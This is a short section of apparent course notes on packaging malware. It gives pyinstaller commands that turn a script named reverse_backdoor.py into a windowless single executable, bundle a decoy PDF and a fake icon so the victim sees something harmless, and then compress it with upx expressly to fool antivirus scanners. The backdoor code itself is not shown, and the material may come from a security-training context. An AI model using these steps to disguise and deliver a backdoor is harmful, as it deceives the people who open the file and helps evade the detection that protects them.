# Section 15: Writing Malware - Packaging

Sources in this section are based on `section-14` and `section-12` files

`pyinstaller` is used to package Python script as executable. To convert a script, execute:
```shell
pyinstaller reverse_backdoor.py --noconsole --onefile
```

Next improvement is to show in foreground something useful to user, say PDF file and an icon for a file:
```shell
pyinstaller reverse_backdoor.py --noconsole --onefile --add-data "/var/www/html/files/sample.pdf;." --icon /path/to/.ico/file
```

Next use [upx](https://github.com/upx/upx) to compress binary to better fool antivirus scanner:
```shell
./upx /path/to/executable /path/to/compressed/executable
```